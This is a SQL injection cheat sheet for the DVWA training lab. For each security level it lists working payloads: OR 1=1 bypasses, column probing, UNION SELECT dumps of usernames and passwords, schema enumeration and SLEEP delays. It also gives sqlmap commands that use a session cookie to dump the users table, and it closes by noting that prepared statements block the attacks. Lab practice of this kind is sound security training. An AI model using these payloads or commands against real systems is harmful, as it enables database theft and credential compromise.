Low Security (Easy)

Basic String Injection

In Low security, the input is placed directly into the query without any escaping.
Where to type: Enter these payloads directly into the "User ID" text box on the DVWA page and click Submit.

Basic Authentication Bypass

1' OR '1'='1 1' OR '1'='1' # 1' OR '1'='1' -- -

Find Number of Columns

1' ORDER BY 1# 1' ORDER BY 2# 1' ORDER BY 3#

UNION SELECT Attacks

1' UNION SELECT user,password FROM users# 1' UNION SELECT database(),user()# 1' UNION SELECT @@version,user()#

Enumerate Tables

1' UNION SELECT table_name,table_schema FROM information_schema.tables#

Enumerate Columns

1' UNION SELECT column_name,table_name FROM information_schema.columns#

Medium Security

Numeric Injection (No Quotes)

The application removes single quotes using mysqli_real_escape_string() and uses a dropdown instead of a text box.
Where to type: Since there is no text box, you cannot type these normally. You must right-click the dropdown, select "Inspect" (DevTools), and change the value="1" attribute of an option to the payload. Alternatively, intercept the request using Burp Suite and modify the id POST parameter.

Numeric Injection

1 OR 1=1 1 UNION SELECT user,password FROM users# 1 UNION SELECT database(),@@version#

Numeric Enumeration

1 UNION SELECT table_name,table_schema FROM information_schema.tables# 1 UNION SELECT column_name,table_name FROM information_schema.columns#

High Security

Second-Order / Out-of-Band

The vulnerability is the same as the Low level, but the input form is on a different page (session-input) than the output results. Quotes are allowed again.
Where to type: Click the "here to change your ID" link. A small popup window will appear. Type your payload into the "ID" text box in the popup, click Submit, and then look at the main page to see the result.

Boolean Bypass & UNION

1' OR '1'='1'# 1' OR '1'='1' -- - 1' UNION SELECT user,password FROM users# 1' UNION SELECT user,password FROM users-- -

Time Delay Testing

1' AND SLEEP(5)# 1' AND SLEEP(10)-- -

Database Enumeration

1' UNION SELECT database(),user()# 1' UNION SELECT @@version,user()#

Impossible Security

How it is fixed

Payloads That Fail

1' OR '1'='1 1' UNION SELECT user,password FROM users# 1' AND SLEEP(5)#

Reason: The developer used Prepared Statements (Parameterized Queries) and proper Input Validation. The SQL structure is compiled first, and the input is passed strictly as data.

SQLMAP Commands

Automating the attacks via Terminal

Where to type: These are command-line tools. You must run these in your Kali Linux Terminal. Make sure to replace TARGET or localhost with your actual target IP, and replace YOURSESSION with your actual PHPSESSID cookie value (found in DevTools > Application > Cookies).

Find Databases

sqlmap -u "http://localhost/vulnerabilities/sqli/" \ --cookie="PHPSESSID=YOURSESSION; security=low" \ --dbs

POST Injection (Medium Level)

sqlmap -u "http://localhost/vulnerabilities/sqli/" \ --data="id=1&Submit=Submit" \ --cookie="PHPSESSID=YOURSESSION; security=medium" \ -p id --dbs

List Tables & Dump Data

sqlmap -u "TARGET" -D dvwa --tables sqlmap -u "TARGET" -D dvwa -T users --dump

Faster Enumeration

sqlmap -u "TARGET" --batch --threads 5
